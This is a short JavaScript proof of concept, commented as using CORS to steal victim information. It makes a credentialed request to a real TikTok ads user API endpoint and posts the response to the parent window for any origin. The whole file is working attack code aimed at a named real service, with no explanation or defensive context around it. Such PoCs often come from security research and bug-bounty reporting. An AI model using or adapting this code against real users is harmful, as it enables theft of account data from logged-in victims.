/*Using CORS to steal victim's informations*/
     var xmlhttp1 = new XMLHttpRequest()
     xmlhttp1.onreadystatechange=function()
	{
		if (xmlhttp1.readyState==4 && xmlhttp1.status==200)
		{
			top.postMessage(xmlhttp1.responseText, '*');
		}
	}
    	
	xmlhttp1.open("GET","https://ads.tiktok.com/athena/api/user/",true);
	xmlhttp1.withCredentials = true;
	xmlhttp1.send();

